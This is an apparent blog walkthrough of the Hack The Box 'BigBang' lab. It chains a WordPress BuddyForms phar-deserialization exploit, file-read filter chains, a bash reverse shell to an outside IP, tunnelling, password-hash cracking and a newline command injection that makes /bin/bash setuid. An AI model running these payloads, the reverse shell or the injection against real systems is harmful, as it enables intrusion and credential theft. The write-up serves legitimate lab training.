@@ -1,0 +1,329 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>HTB-H-bigbang | DDL'S BLOG</title><meta name="author" content="DDL"><meta name="copyright" content="DDL"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="HTB-bigbangindex页面又文件上传  存在插件漏洞  去readme.txt可以看到版本号为2.7.7 然后参考漏洞复现  https:&#x2F;&#x2F;medium.com&#x2F;tenable-techblog&#x2F;wordpress-buddyforms-plugin-unauthenticated-insecure-deserialization-cve-2023-26326-3becb5575ed8">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB-H-bigbang">
+<meta property="og:url" content="http://example.com/2025/05/07/HTB-H-bigbang/index.html">
+<meta property="og:site_name" content="DDL&#39;S BLOG">
+<meta property="og:description" content="HTB-bigbangindex页面又文件上传  存在插件漏洞  去readme.txt可以看到版本号为2.7.7 然后参考漏洞复现  https:&#x2F;&#x2F;medium.com&#x2F;tenable-techblog&#x2F;wordpress-buddyforms-plugin-unauthenticated-insecure-deserialization-cve-2023-26326-3becb5575ed8">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/img/avatar.png">
+<meta property="article:published_time" content="2025-05-07T11:10:47.000Z">
+<meta property="article:modified_time" content="2025-05-23T13:10:49.150Z">
+<meta property="article:author" content="DDL">
+<meta property="article:tag" content="HTB">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/avatar.png"><link rel="shortcut icon" href="/img/avatar.png"><link rel="canonical" href="http://example.com/2025/05/07/HTB-H-bigbang/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'HTB-H-bigbang',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  isShuoshuo: false
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">35</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">3</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> blog</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> categories</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> tags</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> crchives</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> link</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> message</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> about</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">DDL'S BLOG</span></a><a class="nav-page-title" href="/"><span class="site-name">HTB-H-bigbang</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> blog</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> categories</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> tags</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> crchives</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> link</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> message</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> about</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">HTB-H-bigbang</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-05-07T11:10:47.000Z" title="Created 2025-05-07 19:10:47">2025-05-07</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-05-23T13:10:49.150Z" title="Updated 2025-05-23 21:10:49">2025-05-23</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/penetration/">penetration</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">1.2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading Time:</span><span>6mins</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="HTB-bigbang"><a href="#HTB-bigbang" class="headerlink" title="HTB-bigbang"></a>HTB-bigbang</h1><p>index页面又文件上传</p>
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20250506095951243.png?raw=true" alt="image-20250506095951243"></p>
+<p>存在插件漏洞</p>
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20250506100016210.png?raw=true" alt="image-20250506100016210"></p>
+<p>去readme.txt可以看到版本号为2.7.7</p>
+<p>然后参考漏洞复现</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://medium.com/tenable-techblog/wordpress-buddyforms-plugin-unauthenticated-insecure-deserialization-cve-2023-26326-3becb5575ed8">https://medium.com/tenable-techblog/wordpress-buddyforms-plugin-unauthenticated-insecure-deserialization-cve-2023-26326-3becb5575ed8</a></li>
+</ul>
+<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><ul>
+<li>cat 1.php</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class Evil&#123;</span><br><span class="line">  public function __wakeup() : void &#123;</span><br><span class="line">    die(&quot;Arbitrary Deserialization&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//create new Phar</span><br><span class="line">$phar = new Phar(&#x27;evil.phar&#x27;);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;addFromString(&#x27;test.txt&#x27;, &#x27;text&#x27;);</span><br><span class="line">$phar-&gt;setStub(&quot;GIF89a\n&lt;?php __HALT_COMPILER(); ?&gt;&quot;);</span><br><span class="line"></span><br><span class="line">// add object of any class as meta data</span><br><span class="line">$object = new Evil();</span><br><span class="line">$phar-&gt;setMetadata($object);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>php –define phar.readonly&#x3D;0 1.php</p>
+</li>
+<li><p>strings 1.phar<br>&#x2F;&#x2F;检查</p>
+</li>
+</ul>
+<p>开启python服务，然后传文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i -F &quot;action=upload_image_from_url&quot; -F &quot;url=http://10.10.16.5:80/evil.phar&quot; -F &quot;id=1&quot; -F &quot;accepted_files=image/gif&quot; http://blog.bigbang.htb/wp-admin/admin-ajax.php</span><br></pre></td></tr></table></figure>
+
+<p>然后用这个远程文件包含尝试一下进行phar反序列化</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i -F &quot;action=upload_image_from_url&quot; -F &quot;url=phar://../wp-content/uploads/2025/1-25.png&quot; -F &quot;id=1&quot; -F &quot;accepted_files=image/gif&quot; http://blog.bigbang.htb/wp-admin/admin-ajax.php</span><br></pre></td></tr></table></figure>
+
+<p>响应是失败的</p>
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20250506104621097.png?raw=true" alt="image-20250506104621097"></p>
+<h3 id="解决问题1"><a href="#解决问题1" class="headerlink" title="解决问题1"></a>解决问题1</h3><p>利用工具实现任务文件读取</p>
+<p>工具wrapwrap</p>
+<p>生成一个 <code>php://filter</code> 链，为文件内容添加前缀和后缀。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">python3 wrapwrap.py /etc/passwd &#x27;GIF89a&#x27; &#x27;;&#x27; 1000</span><br><span class="line"></span><br><span class="line">echo &quot;action=upload_image_from_url&amp;url=$(cat chain.txt)&amp;id=1&amp;accepted_files=image/gif&quot; &gt; curl_data.txt</span><br><span class="line"></span><br><span class="line">curl -i -H &#x27;Content-Type: application/x-www-form-urlencoded&#x27; -d @curl_data.txt http://blog.bigbang.htb/wp-admin/admin-ajax.php</span><br><span class="line"></span><br><span class="line">curl -s http://blog.bigbang.htb/wp-content/uploads/2025/05/1-26.png -o - </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20250506111917371.png?raw=true" alt="image-20250506111917371"></p>
+<h3 id="解决问题2"><a href="#解决问题2" class="headerlink" title="解决问题2"></a>解决问题2</h3><p>拿不到shell，只能自己按照cnext走一遍</p>
+<h4 id="先读取版本"><a href="#先读取版本" class="headerlink" title="先读取版本"></a>先读取版本</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27; ; python3 wrapwrap.py &quot;$filename&quot; &#x27;GIF89a&#x27; &#x27;&#x27; 1200 &gt;/dev/null &amp;&amp; echo &quot;action=upload_image_from_url&amp;url=$(cat chain.txt)&amp;id=1&amp;accepted_files=image/gif&quot; &gt; curl_data.txt &amp;&amp; curl -s -H &#x27;Content-Type: application/x-www-form-urlencoded&#x27; -d @curl_data.txt http://blog.bigbang.htb/wp-admin/admin-ajax.php | jq &#x27;.response&#x27; | xargs curl -s -o - | sed -e &#x27;s/GIF89a//g&#x27; -e &#x27;s/=0A/\n/g&#x27; -e &#x27;s/=0D/\r/g&#x27; -e &#x27;s/&gt;=.*//g&#x27; | strings | grep &#x27;release version&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>然后根据读取的版本进行一个本地起一个</p>
+<ul>
+<li>docker run -it –rm debian:12.4</li>
+<li>apt update &amp;&amp; apt install -y netcat-openbsd</li>
+<li>sudo nc -q 3 -lnvp 443 &gt; libc.so.6<ul>
+<li>kali这监听</li>
+</ul>
+</li>
+<li>nc -q 3 -nv 172.17.0.1 443 &lt; &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6<ul>
+<li>在docker里往外传</li>
+</ul>
+</li>
+</ul>
+<h3 id="拿到docker内部的shell"><a href="#拿到docker内部的shell" class="headerlink" title="拿到docker内部的shell"></a>拿到docker内部的shell</h3><p>修改cnext脚本，把文件包含修改成rce，libc.so.6文件用本地的，之后</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 1.py http://blog.bigbang.htb/wp-admin/admin-ajax.php &#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.16.5/443 0&gt;&amp;1&quot;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>拿到shell</p>
+<h2 id="二段"><a href="#二段" class="headerlink" title="二段"></a>二段</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/www/html/wordpress/wp-config.php</span><br></pre></td></tr></table></figure>
+
+<p>暂时没用</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">curl -s http://10.10.16.5/chisel -o chisel</span><br><span class="line"></span><br><span class="line"><span class="built_in">chmod</span> +x ./chisel</span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> ./chisel server --port 8081 --reverse &amp;</span><br><span class="line"></span><br><span class="line">./chisel client 10.10.16.5:8081 R:127.0.0.1:3306:172.17.0.1:3306 &amp;</span><br><span class="line">现在是在kali上的3306本地端口可以连接到题目docker外部的数据库了</span><br></pre></td></tr></table></figure>
+
+<p>查询</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql -h 127.0.0.1 -P 3306 -u &#x27;wp_user&#x27; -p&#x27;wp_password&#x27;</span><br><span class="line"></span><br><span class="line">use wordpress;</span><br><span class="line"></span><br><span class="line">select * from wp_users;</span><br></pre></td></tr></table></figure>
+
+<p>能查到用户密码的hash，然后就是爆破</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john 1.txt --wordlist=/usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<p>得到quantumphysics </p>
+<p>ssh连接得到</p>
+<h2 id="第一个flag"><a href="#第一个flag" class="headerlink" title="第一个flag"></a>第一个flag</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ssh shawking@blog.bigbang.htb</span><br><span class="line">quantumphysics </span><br><span class="line"></span><br><span class="line">cat user.txt</span><br><span class="line">286ca6cd736803c92a00622d55c20e2d</span><br></pre></td></tr></table></figure>
+
+<p>ps aux 看到3000-端口有root服务，通过ssh隧道带出来</p>
+<p>netstat -tnl</p>
+<p>可以看到9090端口，37837端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -f -N -L 127.0.0.1:9090:127.0.0.1:9090 -L 127.0.0.1:3000:127.0.0.1:3000 -L 127.0.0.1:37837:127.0.0.1:37837 shawking@blog.bigbang.htb</span><br></pre></td></tr></table></figure>
+
+<p>扫扫</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -Pn -sT -p9090,3000,37837 -sC -sV -oN forward.txt 127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<h3 id="3000端口"><a href="#3000端口" class="headerlink" title="3000端口"></a>3000端口</h3><p>没有哪个啥，3000端口是个web服务</p>
+<p>漏洞参考</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/eeeeeeeeee-code/POC/blob/main/wpoc/Grafana/Grafana%E8%A1%A8%E8%BE%BE%E5%BC%8F%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C(CVE-2024-9264).md">https://github.com/eeeeeeeeee-code/POC/blob/main/wpoc/Grafana/Grafana%E8%A1%A8%E8%BE%BE%E5%BC%8F%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C(CVE-2024-9264).md</a></li>
+</ul>
+<p>查找有用信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name &#x27;*grafana*&#x27; 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="破解"><a href="#破解" class="headerlink" title="破解"></a>破解</h3><ul>
+<li><p><a target="_blank" rel="noopener" href="https://github.com/iamaldi/grafana2hashcat">https://github.com/iamaldi/grafana2hashcat</a></p>
+</li>
+<li><p>sqlite3 grafana.db ‘select * from user;’ | cut -d ‘|’ -f 6,7 | tr ‘|’, ‘,’ &gt; hashes.txt</p>
+</li>
+<li><p>python3 grafana2hashcat.py -o g2h.txt hashes.txt</p>
+</li>
+<li><p>hashcat -m 10900 g2h.txt –wordlist &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt</p>
+</li>
+</ul>
+<p>这个获取的密码可以进行登录</p>
+<ul>
+<li>su developer</li>
+<li>bigbang</li>
+</ul>
+<h3 id="获得第二个账户"><a href="#获得第二个账户" class="headerlink" title="获得第二个账户"></a>获得第二个账户</h3><h3 id="9000端口"><a href="#9000端口" class="headerlink" title="9000端口"></a>9000端口</h3><p>查找可写文件，看看权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -type f -writable 2&gt;/dev/null | grep -vE &#x27;/proc|/sys&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>分析一下apk</p>
+<ul>
+<li>apktool d -o decompiled_apk satellite-app.apk </li>
+<li>grep -iar ‘bigbang.htb’ decompiled_apk</li>
+</ul>
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20250506143639753.png?raw=true" alt="image-20250506143639753"></p>
+<p>扫描出来俩目录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">./gobuster dir -u &#x27;http://app.bigbang.htb:9090/&#x27; -w /usr/share/Seclists/Discovery/Web-Content/big.txt -t 100 -o dir.txt</span><br><span class="line"></span><br><span class="line">/command              (Status: 405) [Size: 153]</span><br><span class="line">/login                (Status: 405) [Size: 153]</span><br><span class="line"></span><br><span class="line">修改请求方法</span><br><span class="line">curl -si -X OPTIONS http://app.bigbang.htb:9090/login</span><br><span class="line">curl -iX POST http://app.bigbang.htb:9090/login</span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li>curl -iX POST <a target="_blank" rel="noopener" href="http://app.bigbang.htb:9090/login">http://app.bigbang.htb:9090/login</a> -H ‘Content-Type: application&#x2F;json’ -d ‘{“username”: “developer”, “password”: “bigbang”}’<ul>
+<li>获取tocken</li>
+</ul>
+</li>
+</ul>
+<p>利用tocken去执行命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -si -X POST -H &quot;Authorization: Bearer $&#123;token&#125;&quot; -H &#x27;Content-Type: application/json&#x27; -d &#x27;&#123;&quot;command&quot;: &quot;send_image&quot;, &quot;output_file&quot;: &quot;\u000achmod 4777 /bin/bash&quot;&#125;&#x27; http://app.bigbang.htb:9090/command</span><br></pre></td></tr></table></figure>
+
+<p>然后获取shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ls -l /bin/bash</span><br><span class="line"></span><br><span class="line">/bin/bash -ip</span><br></pre></td></tr></table></figure>
+
+<h2 id="第二个flag"><a href="#第二个flag" class="headerlink" title="第二个flag"></a>第二个flag</h2><p>cat &#x2F;root&#x2F;root.txt出了</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="http://example.com">DDL</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="http://example.com/2025/05/07/HTB-H-bigbang/">http://example.com/2025/05/07/HTB-H-bigbang/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/HTB/">HTB</a></div><div class="post-share"><div class="social-share" data-image="/img/avatar.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/05/07/HTB-H-Vintage/" title="HTB-H-Vintage"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">HTB-H-Vintage</div></div><div class="info-2"><div class="info-item-1">HTB-Vintage这个room讲的是一个DPAPI的凭证泄露+基于资源的约束委派+readgMSAPasswrod造成的密码泄露+ 是个windows电脑，提前给了账户  P.Rosa &#x2F; Rosaisbest123  然后扫描一遍，判断是个域控 smb连接进行一下尝试  smbclient -U ‘vintage.htb&#x2F;P.Rosa%Rosaisbest123’ -L &#x2F;&#x2F;DC01.vintage.htb 报错，session setup failed: NT_STATUS_NOT_SUPPORTED 然后查看一下日志↓   smbclient -U ‘vintage.htb&#x2F;P.Rosa%Rosaisbest123’ -L &#x2F;&#x2F;DC01.vintage.htb –debug-stdout -d 10 是刚开始Kerberos验证没通过，ntlm验证应该是不支持    用nxc指定-k Kerberos验证可以  nxc smb DC01.vintage.htb -d vintage.htb -u...</div></div></div></a><a class="pagination-related" href="/2025/04/27/2025TGctf/" title="2025TGctf"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">2025TGctf</div></div><div class="info-2"><div class="info-item-1">web火眼选第二个命令执行的 123shell=`echo &quot;&lt;?= print_r(glob(&#x27;/*&#x27;));&quot; &gt;1.php`;shell=`echo &quot;&lt;?= file_get_contents(&#x27;/tgfffffllllaagggggg&#x27;);&quot; &gt;1.php`;  直面天命+（复仇）12GET /aazz?filename=a/b/c/d/secret.pyGET /aazz?filename=app.py  12345678910111213141516from fenjing import exec_cmd_payload, config_payloadimport logginglogging.basicConfig(level = logging.INFO)def waf(s: str): # 如果字符串s可以通过waf则返回True, 否则返回False    blacklist =...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/05/23/HTB-M-Escape/" title="HTB-M-Escape"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-23</div><div class="info-item-2">HTB-M-Escape</div></div><div class="info-2"><div class="info-item-1">HTB-M-Escape讲的是ADCS-ESC1+MSSQL数据库引起的ntlm窃取+smb信息泄露 信息收集dns没搜集到有用信息 1dig any sequel.htb   smb试试存在RID,收集用户信息作为保存  smb空密码连接有文件  pdf里有个数据库的账户密码，还有几个内部人员姓名  进入数据库查询一下 1SELECT COLUMN_NAME, DATA_TYPE FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = &#x27;spt_fallback_db&#x27;;  1SELECT TOP 10 * FROM spt_fallback_db;  没查询到有用信息，也没权限命令执行，于是采用中间人攻击 在开启python3 Responder.py -I tun0 然后用数据库 读取我主机的共享文件 1EXEC xp_dirtree &#x27;\\10.10.16.14\share&#x27;, 1,...</div></div></div></a><a class="pagination-related" href="/2025/05/23/HTB-M-Jab/" title="HTB-M-Jab"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-23</div><div class="info-item-2">HTB-M-Jab</div></div><div class="info-2"><div class="info-item-1">HTB-Jab扫描端口服务利用 XMPP - 5269, 5270（tcp下载客户端 XMPP 是一个“通用消息标准”。它允许“XMPP 兼容的软件加入 XMPP 消息网络”  先创建，新建一个用户，使用，在利用插件Service Discovery 来进行那个信息收集 可以看到还有三个子域名 然后点击list的用户的查找用户这，顺便开启插件控制台 123456789&lt;iq type=&#x27;set&#x27;     from=&#x27;ddl1@jab.htb&#x27;    to=&#x27;search.jab.htb&#x27;    